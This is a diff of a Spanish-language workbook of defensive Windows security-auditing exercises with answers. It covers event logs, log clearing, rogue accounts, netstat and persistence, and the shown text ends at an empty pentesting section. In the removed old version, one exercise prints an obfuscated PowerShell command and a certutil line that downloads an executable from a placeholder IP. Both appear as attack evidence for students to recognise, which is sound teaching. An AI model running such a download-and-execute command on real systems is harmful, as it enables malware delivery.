@@ -1,294 +1,263 @@
-# Cuaderno de ejercicios — Auditoría de seguridad en un servidor Windows
+---
+doc_id: CUADERNO
+doc_type: cuaderno-ejercicios
+title: Cuaderno de ejercicios — Auditoría de seguridad en Windows
+status: vigente
+origin: ia-assisted
+confidence: alta
+owner: Guía de estudio — Seguridad en red Windows
+last_review: 2026-09-18
+audience: [humano]
+traces: [GUIA-PRINCIPAL, ESC-TESTIGO]
+---
 
-**Documento:** Cuaderno-Ejercicios-Seguridad-Windows.md
-**Versión:** 1.1
-**Estado:** Aprobado (mesa evaluadora, ciclo 4)
-**Fecha:** 2026-09-17
-**Compañero de:** `Beginning-Security-Windows-Network-Guide.md`
-**Audiencia:** quien ya leyó (o está leyendo) la guía base y quiere formar criterio practicando.
+# Cuaderno de ejercicios — Auditoría de seguridad en Windows
+
+> **Cómo usar este cuaderno.** Acompaña a la [Guía principal](Beginning-Security-Windows-Network-Guide.md) y sigue su mismo orden. Cada bloque de ejercicios corresponde a una sección de la guía. Hay dos tipos: **ejercicios de lectura** (razonás sobre el escenario `SRV-MADERA01` o sobre salidas dadas, sin necesitar un Windows) y **ejercicios de laboratorio** (los hacés en el laboratorio aislado de la guía, marcados con 🧪; el **Apéndice A** de la guía explica cómo montarlo y cómo generar la evidencia paso a paso). Todas las respuestas están al final, en la sección **Soluciones**, con su explicación. Intentá resolver antes de mirarlas.
+>
+> **Regla de oro (repetida de la guía):** los ejercicios de laboratorio se hacen **sólo** en tu laboratorio aislado o sobre sistemas con autorización escrita. Nunca sobre sistemas ajenos.
 
 ---
 
-## Cómo usar este cuaderno
+## Índice
 
-Cada ejercicio presenta una **salida de comando o un fragmento de log** y una o más preguntas. Primero **respóndalas usted**, por escrito, antes de mirar la solución. Las respuestas están todas juntas al final (§Respuestas), no debajo de cada ejercicio, justamente para que no las lea de reojo.
-
-- Los ejercicios se apoyan en el **escenario testigo** de la guía (servidor `SRV-FILE01` de `CONTOSO`, ver Anexo D de la guía) y en **micro-casos nuevos** que se declaran cuando aparecen.
-- Todo dato es **sintético y coherente**; las salidas reproducen el formato real de Windows con valores del caso.
-- Dificultad creciente: 🟢 básico, 🟡 intermedio, 🔴 integrador.
-- Se puede resolver **solo leyendo** (con la salida que trae cada ejercicio); el laboratorio es opcional pero recomendado.
-- Muchos ejercicios se pueden **reproducir en el laboratorio** (§10 de la guía) para ver la salida real y fijar el criterio.
-- En los ejercicios 🔴 abiertos, la respuesta del final es una **respuesta modelo**: si usted redactó distinto pero llegó a las mismas conclusiones y las fundamentó, está bien. No se evalúa la redacción, se evalúa el criterio.
-
-**Índice de módulos**
-
-1. [Registro de eventos](#módulo-1--registro-de-eventos)
-2. [Sistema vivo: procesos, servicios, sesiones](#módulo-2--sistema-vivo)
-3. [Red y conexiones](#módulo-3--red-y-conexiones)
-4. [Artefactos y borrado de logs](#módulo-4--artefactos-y-borrado-de-logs)
-5. [Intencionalidad del borrado](#módulo-5--intencionalidad-del-borrado)
-6. [Identidad y Active Directory](#módulo-6--identidad-y-active-directory)
-7. [Caso integrador](#módulo-7--caso-integrador)
-- [Respuestas explicativas](#respuestas-explicativas)
+- [Bloque 1 — Fundamentos (guía §1–2)](#bloque-1--fundamentos-guía-12)
+- [Bloque 2 — No daño y evidencia (guía §3)](#bloque-2--no-daño-y-evidencia-guía-3)
+- [Bloque 3 — Registro de eventos (guía §4)](#bloque-3--registro-de-eventos-guía-4)
+- [Bloque 4 — Accesos y borrado del registro (guía §5)](#bloque-4--accesos-y-borrado-del-registro-guía-5)
+- [Bloque 5 — Cuentas y persistencia (guía §6)](#bloque-5--cuentas-y-persistencia-guía-6)
+- [Bloque 6 — Conexiones, procesos y sesiones (guía §7)](#bloque-6--conexiones-procesos-y-sesiones-guía-7)
+- [Bloque 7 — Auditoría avanzada (guía §8)](#bloque-7--auditoría-avanzada-guía-8)
+- [Bloque 8 — Método de caza (guía §9)](#bloque-8--método-de-caza-guía-9)
+- [Bloque 9 — Pentesting en laboratorio (guía §10–11)](#bloque-9--pentesting-en-laboratorio-guía-1011)
+- [Proyecto integrador](#proyecto-integrador)
+- [Soluciones](#soluciones)
 
 ---
 
-# Módulo 1 — Registro de eventos
+## Bloque 1 — Fundamentos (guía §1–2)
 
-### Ejercicio 1.1 🟢
-Observa este fragmento del registro de seguridad (consultado en el colector):
+**1.1** Clasificá cada dirección como privada o pública, y explicá cómo lo sabés: `10.10.0.10`, `198.51.100.77`, `192.168.56.20`, `203.0.113.9`.
 
-```
-TimeCreated           Id    Cuenta     Tipo   Dirección de origen
-15/09/2026 03:11:41   4625  soporte    10     203.0.113.14
-15/09/2026 03:11:57   4625  soporte    10     203.0.113.14
-15/09/2026 03:12:20   4625  soporte    10     203.0.113.14
-15/09/2026 03:14:22   4624  soporte    10     203.0.113.14
-```
+**1.2** El servidor `SRV-MADERA01` tiene abierto el puerto 3389. ¿Qué servicio es, y por qué que esté publicado a internet es un vicio?
 
-**Preguntas:** (a) ¿Qué está ocurriendo en las tres primeras líneas? (b) ¿Qué significa la cuarta y por qué es más grave que las anteriores? (c) ¿Qué tipo de inicio de sesión es el 10?
+**1.3** Emparejá cada puerto con su servicio: `445`, `88`, `389`, `53`, `3389`. Opciones: DNS, SMB, Kerberos, LDAP, RDP.
 
-### Ejercicio 1.2 🟡
-Dos fragmentos de 4625 de dos incidentes distintos:
+**1.4** Explicá con tus palabras por qué comprometer el controlador de dominio es más grave que comprometer una PC de escritorio.
 
-```
-Caso A:  Cuenta: administrador   Subestado: 0xC000006A   (x60 en 5 min)
-Caso B:  Cuenta: jdoe, mgarcia, root, admin, test ...    Subestado: 0xC0000064   (x300, nombres distintos)
-```
-
-**Pregunta:** ¿Cuál es fuerza bruta sobre una cuenta y cuál es *password spraying*? Justifique con el subestado.
-
-### Ejercicio 1.3 🟡
-En el registro de seguridad de `SRV-FILE01` (local) usted encuentra **un solo evento**: un 1102 con fecha 15/09 03:40:11, sujeto `svc_update`. No hay 4624, ni 4720, ni nada anterior.
-
-**Preguntas:** (a) ¿Por qué el log tiene un único evento? (b) ¿Dónde puede recuperar los eventos que faltan? (c) ¿El hecho de que falten prueba que no hubo actividad antes?
+**1.5** Un evento muestra un inicio de sesión de la cuenta `Administrador`. ¿Por qué el investigador quiere ver también el **SID** y no se conforma con el nombre?
 
 ---
 
-# Módulo 2 — Sistema vivo
+## Bloque 2 — No daño y evidencia (guía §3)
 
-### Ejercicio 2.1 🟢
-Salida de `Get-Process` (extracto):
+**2.1** Ordená estas fuentes de evidencia de la más volátil a la más estable: `archivo de log archivado en el NAS`, `conexiones de red activas`, `un documento en el disco`, `procesos en memoria`. Justificá con el orden de volatilidad.
 
-```
-Id    ProcessName   Path
-612   lsass         C:\Windows\System32\lsass.exe
-7104  svchost       C:\Windows\System32\svchost.exe
-9310  update        C:\Users\Public\update.exe
-1180  lsass         C:\Users\Public\lsass.exe
-```
+**2.2** Tu jefe, nervioso, te dice: «reiniciá el servidor a ver si se soluciona». Redactá en dos o tres frases por qué eso puede destruir evidencia y qué proponés en cambio.
 
-**Pregunta:** dos de estas líneas son sospechosas. ¿Cuáles y por qué? (Hay dos motivos distintos.)
+**2.3** Encontrás una cuenta sospechosa llamada `sqlbackup`. ¿Cuál es la secuencia correcta de acciones y por qué **no** empezás por borrarla?
 
-### Ejercicio 2.2 🟡
-Árbol de procesos (micro-caso nuevo: estación de trabajo `PC-VENTAS07`):
-
-```
-ParentProcessId  ProcessId  Name             CommandLine
-6620 (OUTLOOK)   7010       winword.exe      "Factura_09.docx"
-7010 (WINWORD)   7188       powershell.exe   -w hidden -enc JABzAD0A...
-7188 (POWERSHELL) 7205      certutil.exe     -urlcache -split -f http://203.0.113.14/a.exe
-```
-
-**Preguntas:** (a) Reconstruya la historia: ¿qué pasó, en orden? (b) ¿Qué dos banderas de `powershell.exe` son señales de alarma? (c) ¿Qué está haciendo `certutil` y por qué es un abuso?
-
-### Ejercicio 2.3 🟡
-Servicio hallado en `SRV-FILE01`:
-
-```
-Name          State    StartMode  PathName
-WinDefendUpd  Running  Auto       C:\Users\Public\update.exe
-```
-
-**Pregunta:** enumere tres indicios de que este servicio es malicioso y diga con qué evento del registro confirmaría cuándo se instaló.
+**2.4** Situá cada actividad en su fase del ciclo NIST SP 800-61: *tener Sysmon instalado de antemano*, *reconstruir la línea de tiempo*, *cerrar el puerto 3389 y cambiar contraseñas*, *escribir el informe de lecciones aprendidas*.
 
 ---
 
-# Módulo 3 — Red y conexiones
+## Bloque 3 — Registro de eventos (guía §4)
 
-### Ejercicio 3.1 🟢
-Salida de conexiones externas en `SRV-FILE01`:
+**3.1** ¿Qué canal del registro consultás para cada hecho? (a) un inicio de sesión fallido; (b) un servicio nuevo instalado; (c) un error de una aplicación de facturación.
 
-```
-Destino               PID    Proceso   Ruta
-20.190.160.14:443     7104   svchost   C:\Windows\System32\svchost.exe
-203.0.113.14:443      9310   update    C:\Users\Public\update.exe
-```
+**3.2** Escribí el comando de PowerShell que traiga **sólo** los eventos con Id. 4625 del canal Security ocurridos el 4 de mayo de 2026.
 
-**Preguntas:** (a) ¿Cuál conexión investigaría primero y por qué? (b) ¿Cómo enlaza esta salida con la del ejercicio 2.3?
+**3.3** «Faltan los eventos de hace tres semanas.» Antes de gritar «¡borraron el log!», ¿qué comando corrés y qué explicación alternativa considerás?
 
-### Ejercicio 3.2 🔴
-Un administrador afirma: "Revisé las conexiones con `netstat` tres veces hoy y nunca vi nada raro, así que el servidor está limpio."
-
-**Pregunta:** explique por qué ese razonamiento es insuficiente y qué haría usted para cubrir el hueco.
-
-### Ejercicio 3.3 🟡
-En el firewall aparece que `SRV-FILE01` se conecta a `203.0.113.14:443` **exactamente cada 60 segundos**, enviando siempre unos 2 KB, las 24 horas.
-
-**Pregunta:** ¿qué nombre recibe ese patrón y por qué es sospechoso, si el tráfico va cifrado por 443 (HTTPS) como el de cualquier web?
+**3.4** 🧪 En tu laboratorio, abrí el Visor de eventos, filtrá el canal Security por Id. 4624 y abrí uno. Anotá el valor del campo *Logon Type* y del campo *Logon ID*.
 
 ---
 
-# Módulo 4 — Artefactos y borrado de logs
+## Bloque 4 — Accesos y borrado del registro (guía §5)
 
-### Ejercicio 4.1 🟡
-El atacante borró los logs **y** borró `C:\Users\Public\update.exe` del disco. Un compañero concluye: "Ya no hay forma de probar que ese programa corrió."
+Trabajá sobre este extracto ilustrativo del canal Security de `SRV-MADERA01`:
 
-**Pregunta:** ¿es correcto? Nombre al menos tres artefactos que podrían probar la ejecución pese al doble borrado, y qué aporta cada uno.
-
-### Ejercicio 4.2 🟢
-Ordene estas cuatro evidencias de **más** a **menos** volátil (cuál recolectaría primero): (1) un archivo `.evtx` en disco, (2) la memoria RAM, (3) un backup en otra ciudad, (4) las conexiones de red activas.
-
-### Ejercicio 4.3 🔴
-Usted llega al servidor sospechoso. Su jefe dice: "Reinícialo para cortar el ataque." 
-
-**Pregunta:** ¿qué le respondería y qué haría en su lugar? Justifique con el orden de volatilidad.
-
----
-
-# Módulo 5 — Intencionalidad del borrado
-
-### Ejercicio 5.1 🟡
-El registro de seguridad de `SRV-CONTA02` (micro-caso nuevo) tiene su evento más antiguo fechado hace apenas 6 horas, pero el `RecordId` del primer evento es **481.203** y la numeración sube de forma continua. **No** hay ningún 1102.
-
-**Pregunta:** ¿esto es un borrado malicioso? Justifique.
-
-### Ejercicio 5.2 🔴
-Compare dos hallazgos:
-
-```
-Caso A:  Security con un 1102 a las 03:40, sujeto svc_update (cuenta creada esa madrugada),
-         precedido de un 1100 a las 03:39. Nadie del equipo registró la acción.
-Caso B:  Security vaciado con un 1102 a las 02:00 de un domingo, sujeto flopez (admin conocida),
-         que figura en el calendario de mantenimiento con el ticket #4471 "rotación de logs".
+```text
+02:14–03:11  843 × Evento 4625  Sub Status 0xC000006A  Source: 198.51.100.77
+03:12        Evento 4624  Logon Type 10  Source: 198.51.100.77  Cuenta: Administrador  LogonID 0x5F3A2
+03:14        Evento 4720  Cuenta creada: sqlbackup
+03:14        Evento 4732  sqlbackup agregada a Administradores
+(Día 2)
+03:05        Evento 1102  Registro borrado  Sujeto: sqlbackup  LogonID 0x7A441
 ```
 
-**Pregunta:** ambos tienen un 1102. ¿Cuál es intencional-malicioso y cuál es legítimo? ¿Qué señales lo deciden?
+**4.1** ¿Qué significa la ráfaga de 843 eventos 4625 con subestado `0xC000006A` desde una sola IP? ¿Qué habría cambiado si el subestado fuera `0xC0000064`?
 
-### Ejercicio 5.3 🟡
-Verdadero o falso, y por qué: "Si un registro de eventos aparece vacío pero **no** tiene ningún evento 1102, entonces seguro que nadie lo borró; se vació solo."
+**4.2** El evento 4624 de las 03:12 es tipo 10. ¿Qué quiere decir «tipo 10» y por qué, combinado con la IP de origen y la hora, es una alarma?
+
+**4.3** El evento 1102 tiene `LogonID 0x7A441` y sujeto `sqlbackup`. ¿Qué harías para demostrar desde qué IP se conectó quien borró el registro?
+
+**4.4** Explicá la paradoja del evento 1102: ¿cómo puede ser que borrar el registro *genere* evidencia en vez de destruirla?
+
+**4.5** ¿Por qué el investigador no confía en que «el log está limpio» significa «no pasó nada»?
 
 ---
 
-# Módulo 6 — Identidad y Active Directory
+## Bloque 5 — Cuentas y persistencia (guía §6)
 
-### Ejercicio 6.1 🟢
-Miembros del grupo Administradores de `SRV-FILE01`:
+**5.1** Dada esta salida de `Get-LocalGroupMember -Group 'Administradores'`, ¿cuál cuenta investigarías primero y por qué?
 
+```text
+Administrador   (línea de base: sí)
+sqlbackup       (línea de base: no; contraseña creada el Día 1 03:14)
+soporte         (línea de base: sí, cuenta de auditoría)
 ```
-SRV-FILE01\Administrador
-CONTOSO\Administradores del dominio
-SRV-FILE01\svc_update
+
+**5.2** Un servicio tiene `PathName = C:\Windows\Temp\wsvc.exe` y arranque automático. Enumerá tres razones por las que es sospechoso.
+
+**5.3** ¿Qué secuencia de dos Event IDs, en orden y con la misma cuenta, es la firma de la creación de una puerta trasera con privilegios? ¿En qué se diferencia el 4732 del 4728?
+
+**5.4** 🧪 En el laboratorio, creá una tarea programada que ejecute `calc.exe` al iniciar sesión. Después buscá el evento que la registró. ¿Qué Id. es y en qué canal está?
+
+**5.5** ¿Por qué encontrar y cambiar la contraseña forzada del `Administrador` **no** cierra el incidente?
+
+---
+
+## Bloque 6 — Conexiones, procesos y sesiones (guía §7)
+
+Trabajá sobre esta salida ilustrativa de `netstat -ano`:
+
+```text
+Proto  Local              Remota                Estado        PID
+TCP    10.10.0.10:3389    198.51.100.77:52001   ESTABLISHED   4120
+TCP    10.10.0.10:49712   203.0.113.9:443        ESTABLISHED   6688
+TCP    10.10.0.10:445     10.10.0.34:51002      ESTABLISHED   4
+TCP    0.0.0.0:3389       0.0.0.0:0             LISTENING     1520
 ```
 
-**Pregunta:** ¿cuál entrada investigaría y qué evento buscaría para saber quién la agregó y cuándo?
+**6.1** ¿Cuál de las cuatro líneas es la más sospechosa y por qué? ¿Cuál es claramente normal?
 
-### Ejercicio 6.2 🔴 (de reconocimiento y escalamiento)
-*Objetivo: no se espera que usted resuelva este ataque, sino que lo reconozca y sepa que debe escalarlo.*
+**6.2** Tenés el PID `6688`. Escribí los dos comandos (uno con `tasklist`, uno con `Get-CimInstance`) que usarías para saber qué programa es, dónde está y a qué se conecta.
 
-En el controlador de dominio aparece un evento **4662** con permisos de replicación (`DS-Replication-Get-Changes`) originado desde `10.0.20.55`, que es la IP de una estación de trabajo de ventas, no de un controlador de dominio.
+**6.3** Corrés `netstat` tres veces seguidas y la conexión a `203.0.113.9` aparece sólo una vez. ¿Qué significa y qué fuente de datos necesitás para ver el histórico?
 
-**Preguntas:** (a) ¿Qué ataque sugiere? (b) ¿Por qué es gravísimo? (c) ¿Debería usted resolverlo solo?
+**6.4** El proceso del PID 6688 se llama `svch0st.exe`. ¿Qué detalle del nombre delata la intención y por qué mirás la línea de comandos además del nombre?
 
----
-
-# Módulo 7 — Caso integrador
-
-### Ejercicio 7.1 🔴
-Reúna las piezas del escenario testigo. Con estos hallazgos:
-
-- Log local de `SRV-FILE01` casi vacío, arranca con un 1102 (03:40, `svc_update`).
-- `svc_update` es admin local; nadie la creó a propósito.
-- En el colector: 4624 tipo 10 de `soporte` desde `203.0.113.14` (03:14), 4720/4732 de `svc_update` (03:16).
-- `update.exe` (PID 9310) corriendo desde `C:\Users\Public`, conectado a `203.0.113.14:443`, también como servicio y tarea.
-- Prefetch de `UPDATE.EXE` fechado 03:20; SRUM: ~2,3 GB salientes por `update.exe`.
-
-**Preguntas:** (a) Escriba la línea de tiempo del ataque, en orden. (b) ¿Cuál fue el punto de entrada y qué vicio lo permitió? (c) ¿Hubo exfiltración? ¿Con qué evidencia? (d) ¿Cuál sería su **primer** paso de respuesta y cuál **no** debe hacer todavía?
-
-### Ejercicio 7.2 🔴
-A partir del caso 7.1, proponga **tres medidas de endurecimiento** que habrían impedido o detectado antes este ataque, y diga qué parte de la cadena corta cada una.
-
----
----
-
-# Respuestas explicativas
-
-> Las respuestas no solo dicen "qué"; explican el **porqué**, para que el criterio quede formado y pueda aplicarlo a un caso distinto. Entre paréntesis, la sección de la guía donde profundizar.
-
-## Módulo 1
-
-**1.1** (a) Tres **intentos fallidos** de inicio de sesión (evento 4625) contra la cuenta `soporte`, todos por RDP y desde la misma IP externa: es un ataque de adivinación de contraseña en curso. (b) La cuarta línea es un 4624 = **inicio de sesión exitoso**, misma cuenta, misma IP, tres minutos después: el atacante **acertó** la contraseña y entró. Es más grave porque ya no es un intento, es un acceso conseguido. (c) El tipo 10 es **escritorio remoto (RDP)**. La secuencia "muchos fallos → un éxito desde la misma IP externa" es la firma de una contraseña finalmente adivinada. (Guía §5.4, §5.4.1)
-
-**1.2** El **Caso A** es fuerza bruta sobre **una** cuenta: el subestado `0xC000006A` significa "la cuenta existe pero la contraseña es incorrecta", y todos los intentos van contra `administrador`; el atacante sabe que existe y le prueba claves. El **Caso B** es *password spraying*: el subestado `0xC0000064` significa "el usuario no existe", y los nombres cambian; el atacante prueba nombres al azar (o una contraseña común contra muchos usuarios). Leer el subestado es lo que distingue los dos ataques, que se defienden distinto. (Guía §5.4)
-
-**1.3** (a) Porque hubo un **borrado total** del registro a las 03:40: el 1102 es el primer evento del log nuevo, y todo lo anterior se eliminó. (b) En el **colector WEF** (`SRV-LOG01`), que recibió los eventos cuando ocurrieron, antes del borrado. (c) **No**: la ausencia de eventos no prueba ausencia de actividad; aquí prueba lo contrario (alguien se tomó el trabajo de borrarlos). La ausencia nunca descarta; solo la presencia confirma. (Guía §5.5, §5.6, §7.6)
-
-## Módulo 2
-
-**2.1** Línea 3 (`update` en `C:\Users\Public`): un proceso legítimo del sistema **no** corre desde una carpeta de usuario; ruta anómala. Línea 4 (`lsass` en `C:\Users\Public`): usa el **nombre de un proceso legítimo de Windows** (`lsass.exe`), pero desde la ruta equivocada — el `lsass` real vive solo en `C:\Windows\System32`. Son dos motivos distintos: uno es un nombre cualquiera en lugar raro; el otro es un **impostor** que roba un nombre de sistema. (Guía §6.1, §6.2)
-
-**2.2** (a) Llegó un correo (Outlook) con un adjunto Word (`Factura_09.docx`); al abrirlo, Word lanzó PowerShell, y PowerShell lanzó `certutil` para descargar un ejecutable. Es la cadena clásica de un documento malicioso. (b) `-w hidden` (ventana oculta) y `-enc` (comando codificado en Base64 para que no se lea): dos señales de ocultamiento. (c) `certutil` es una herramienta legítima de certificados, pero aquí se usa con `-urlcache -split -f` para **descargar** un archivo desde Internet: es "vivir de la tierra" (usar una herramienta del sistema para fines maliciosos y evadir el antivirus). El proceso padre imposible (Word → PowerShell) es lo que delata todo. (Guía §3.4, §6.3)
-
-**2.3** Tres indicios: (1) el ejecutable está en `C:\Users\Public`, donde un servicio real nunca vive; (2) el nombre `WinDefendUpd` imita al antivirus para pasar desapercibido; (3) arranca en modo automático (`Auto`), garantizando persistencia tras reinicios. Se confirma **cuándo y por quién** se instaló con el evento **7045** (registro System), que además puede haber sobrevivido si el atacante borró solo el Security. (Guía §6.4, §5.4)
-
-## Módulo 3
-
-**3.1** (a) La segunda: `update.exe` desde `C:\Users\Public` conectado a `203.0.113.14:443`. Reúne tres indicios (ruta anómala, nombre genérico, IP externa desconocida), mientras que `svchost` desde System32 hacia un rango de Microsoft es plausiblemente legítimo. (b) Es el **mismo PID (9310)** del servicio malicioso del 2.3: el proceso que persiste como servicio es el que está hablando con el exterior. El PID enlaza las dos vistas. (Guía §6.1, §7.2, §7.3)
-
-**3.2** El razonamiento falla por el **problema del muestreo**: `netstat` es una foto instantánea. Un canal de control que se activa unos segundos cada hora casi nunca cae dentro de esas tres fotos. La ausencia en fotos puntuales no descarta actividad intermitente. Para cubrirlo se necesita registro **continuo**: Sysmon (Event ID 3 registra toda conexión con su proceso), y/o los logs del firewall analizados a lo largo del tiempo. La foto sirve para *encontrar* algo activo, no para *descartar* algo intermitente. (Guía §7.1, §7.5, §7.6)
-
-**3.3** Es **beaconing** ("llamar a casa"): comunicación a intervalos regulares y de tamaño constante entre el implante y su servidor de control. Es sospechoso pese a ir por 443 porque lo que delata no es el contenido (cifrado, ilegible) sino el **patrón temporal**: una persona navegando genera tráfico irregular; una máquina que reporta cada 60 segundos exactos, no. Herramientas como RITA buscan justamente esa regularidad. (Guía §7.5)
-
-## Módulo 4
-
-**4.1** Es **incorrecto**. Al menos tres artefactos prueban la ejecución pese al doble borrado: (1) **Prefetch** — Windows creó un `.pf` al ejecutar el programa, que sobrevive al borrado del `.exe` y del log, y dice cuándo corrió; (2) **Amcache/ShimCache** — guardan la huella (incluso el hash) de ejecutables que existieron; (3) **SRUM** — registra cuántos datos envió ese programa, por día, útil para probar exfiltración; (4, extra) **MFT/USN Journal** — recuerdan que el archivo existió y fue borrado. Ninguno es un "log de auditoría", por eso el atacante rara vez los toca. (Guía §8)
-
-**4.2** De más a menos volátil: **(2) memoria RAM → (4) conexiones de red activas → (1) archivo .evtx en disco → (3) backup remoto**. La RAM desaparece al apagar; las conexiones cambian en segundos; el `.evtx` persiste pero puede rotar o ser borrado; el backup remoto es lo más estable. Se recolecta en ese orden. (Guía §4.2)
-
-**4.3** Le respondería que reiniciar es probablemente el peor primer paso: **destruye la memoria RAM** (§4.2), que es la evidencia más valiosa y la única irrecuperable — ahí pueden estar las credenciales robadas y el programa del atacante si solo vive en memoria —, y además puede disparar mecanismos de daño y alertar al atacante. En su lugar: preservar primero (capturar memoria, triage, copias externas), entender el alcance, y **después** contener de forma coordinada (§12.2). La única excepción es un daño irreversible en curso (cifrado masivo): ahí sí se aísla de la red de inmediato — aislar de la red no es lo mismo que reiniciar. (Guía §4.1, §4.2, §4.6)
-
-## Módulo 5
-
-**5.1** **No es un borrado malicioso**: es **rotación normal por tamaño/retención**. La clave está en el `RecordId` **alto y continuo** (481.203, subiendo de a uno): eso prueba que el log **no** se vació (un vaciado reinicia la numeración cerca de 1). El log tiene eventos "recientes" simplemente porque, al llenarse, Windows sobrescribió los más viejos — y eso **no** genera 1102. Que sea corto no basta; hay que descartar la causa legítima primero. (Guía §5.5.1, §5.5.3)
-
-**5.2** El **Caso A es malicioso**; el **Caso B es legítimo**. Ambos tienen un 1102 (o sea, ambos son un vaciado deliberado — el 1102 no aparece solo), pero el contexto decide: en A lo hizo una cuenta creada esa misma madrugada (`svc_update`), a las 03:40, precedido de un 1100 (servicio de eventos detenido) y **sin registro** de la acción — todas señales de encubrimiento. En B lo hizo una **administradora conocida**, en horario de mantenimiento de domingo, **con ticket** que lo documenta. Misma acción técnica, intención opuesta. Intencionalidad maliciosa = vaciado deliberado **+** contexto hostil. (Guía §5.5.3)
-
-**5.3** **Falso.** Un log vacío sin 1102 puede deberse a rotación legítima (§5.1), pero **también** puede ser un **borrado parcial** malicioso (el atacante eliminó eventos individuales para no dejar el 1102), que se delata por un **salto** en el `RecordId`; o pudieron apagar la auditoría (4719/1100) antes de actuar. La ausencia de 1102 no prueba inocencia: hay que mirar la numeración y el contexto. La afirmación confunde "no hay marca de vaciado total" con "nadie tocó nada". (Guía §5.5.1, §5.5.2, §5.5.3)
-
-## Módulo 6
-
-**6.1** Investigaría `SRV-FILE01\svc_update`: las otras dos entradas son esperables (el administrador local y el grupo de administradores del dominio), pero `svc_update` es una cuenta **local** que nadie reconoce. Para saber **quién la agregó y cuándo**, busque el evento **4732** ("se agregó un miembro a un grupo local con seguridad habilitada") en el registro de seguridad — en el colector, si el local fue borrado. (Guía §9.2, §5.4)
-
-**6.2** (a) Sugiere un ataque **DCSync**: alguien le pidió al controlador de dominio que le entregue credenciales replicando el directorio, haciéndose pasar por otro DC. (b) Es gravísimo porque los permisos de replicación permiten **extraer las contraseñas (hashes) de todo el dominio**, incluida la de administrador y la cuenta `krbtgt`; con eso el atacante puede fabricarse credenciales válidas de forma persistente (Golden Ticket). Y el origen es una **estación de ventas**, que jamás debería replicar el directorio. (c) **No**: esto excede una guía introductoria; hay que documentar, preservar y **escalar a un especialista** de inmediato, porque la remediación (rotar `krbtgt` dos veces, revisar todo el dominio) es delicada. (Guía §9.4, §12.3)
-
-## Módulo 7
-
-**7.1** (a) Línea de tiempo: **03:02–03:13** fuerza bruta contra `soporte` (4625); **03:14** acceso RDP exitoso desde `203.0.113.14` (4624 tipo 10); **03:16** creación de `svc_update` y alta como admin (4720/4732); **03:20** ejecución de `update.exe` (Prefetch); **03:22–03:23** persistencia como servicio y tarea; **desde ~03:35** C2 y exfiltración a `203.0.113.14:443`; **03:40** borrado del registro de seguridad. (b) El punto de entrada fue el **RDP expuesto a Internet**, y el vicio que lo permitió fue la cuenta `soporte` con **contraseña débil y administrador local** (más la ausencia de MFA). (c) **Sí hubo exfiltración**: el SRUM muestra ~2,3 GB salientes atribuidos a `update.exe`, un programa que no debería enviar nada. (d) Primer paso: **preservar** (capturar memoria si el equipo sigue vivo, triage, exportar logs a un medio externo, tomar la copia del colector). Lo que **no** debe hacer todavía: reiniciar, cambiar contraseñas o bloquear al atacante de a poco — eso destruye evidencia y lo alerta; la contención se hace después y coordinada. (Guía §4, §5, §8, §12.2)
-
-**7.2** Tres medidas y qué parte de la cadena cortan: (1) **Quitar el RDP de Internet y exigir MFA/VPN** → corta el **acceso inicial** (sin puerta expuesta, la fuerza bruta no llega). (2) **Reenvío de eventos a un colector (WEF) fuera del alcance de los admins locales** → neutraliza el **borrado de logs** (aunque borren el local, la copia queda) y habría dado alerta temprana. (3) **Sysmon + Script Block Logging + menor privilegio para `soporte`** → detecta la **ejecución y persistencia** (proceso en carpeta rara, servicio nuevo, PowerShell oculto) y le quita a `soporte` el admin local que permitió crear la puerta trasera. Complementos válidos: bloqueo de cuentas tras N fallos (contra la fuerza bruta), y egreso de red controlado (contra el C2/exfiltración). (Guía §12.4)
+**6.5** 🧪 En la víctima del laboratorio, corré `Get-NetTCPConnection -State Listen`. Identificá qué puertos está escuchando y cuál de ellos, si estuviera publicado a internet, sería el vicio del escenario.
 
 ---
 
-# Cómo autoevaluarte
+## Bloque 7 — Auditoría avanzada (guía §8)
 
-Cuente un ejercicio como resuelto solo si llegó a la conclusión **y** pudo explicar el porqué (no si adivinó la opción). Los 🔴 valen doble por integradores.
+**7.1** Corrés `auditpol /get /category:*` y ves «Creación de procesos: Sin auditoría». ¿Qué evento te vas a estar perdiendo y cómo lo habilitás?
 
-| Nivel | Señal | Qué le conviene hacer |
-|---|---|---|
-| **Inicial** | Resuelve los 🟢 pero duda en los 🟡 | Relea §2–§7 de la guía y rehaga el módulo donde falló |
-| **En formación** | Resuelve 🟢 y 🟡, se traba en los 🔴 | Practique en el laboratorio (§10) reproduciendo los casos; enfoque §4 (método) y §12 (respuesta) |
-| **Sólido** | Resuelve también los 🔴 y justifica cada uno | Ya reconoce y preserva bien; su rol es detectar temprano y escalar (§12.3). Avance a Sysmon/WEF y a los casos de AD |
+**7.2** Habilitaste la auditoría de creación de procesos pero el campo de línea de comandos de los 4688 sale vacío. ¿Qué falta activar?
 
-**Autodiagnóstico por módulo.** Si falló varios ejercicios de un mismo módulo, ahí tiene su punto débil:
+**7.3** Nombrá tres cosas que Sysmon registra y que la auditoría nativa de Windows no cubre bien. ¿Por qué se dice que Sysmon es «preventivo, no retroactivo»?
 
-- Módulo 1 → §5 (registro de eventos)
-- Módulo 2 → §6 (sistema vivo)
-- Módulo 3 → §7 (red)
-- Módulo 4 → §4 y §8 (método y artefactos)
-- Módulo 5 → §5.5 (detección e intencionalidad del borrado)
-- Módulo 6 → §9 (identidad y AD)
-- Módulo 7 → integra todo; si falla aquí pero aprueba el resto, trabaje el **cruce** de indicios (§12.1)
+**7.4** Explicá por qué centralizar los eventos con WEF es la mejor defensa contra el ataque del evento 1102.
 
 ---
 
-*Fin del cuaderno. Practique en el laboratorio (§10 de la guía): reproducir cada caso y ver la salida real fija el criterio mejor que leerlo.*
+## Bloque 8 — Método de caza (guía §9)
+
+**8.1** Para cada síntoma, escribí la hipótesis y el artefacto que la probaría: (a) «el sistema estuvo lento de madrugada»; (b) «aparecieron archivos renombrados en el compartido».
+
+**8.2** Ordená estos hechos en una línea de tiempo y contá la historia en un párrafo: `1102 borrado`, `4624 tipo 10 desde IP pública`, `843 × 4625`, `4720 sqlbackup`, `proceso a 203.0.113.9:443`.
+
+**8.3** Mapeá cada paso del caso a su técnica MITRE ATT&CK: fuerza bruta, crear cuenta, tarea programada, canal de control, borrar el log.
+
+**8.4** Clasificá cada afirmación como *hecho* o *interpretación*: (a) «hay 843 eventos 4625 desde 198.51.100.77»; (b) «un atacante ruso entró al servidor»; (c) «la cuenta sqlbackup no estaba en la línea de base».
+
+**8.5** Escribí las cuatro recomendaciones de causa raíz que cerrarían el caso `SRV-MADERA01`.
+
+---
+
+## Bloque 9 — Pentesting en laboratorio (guía §10–11)
+
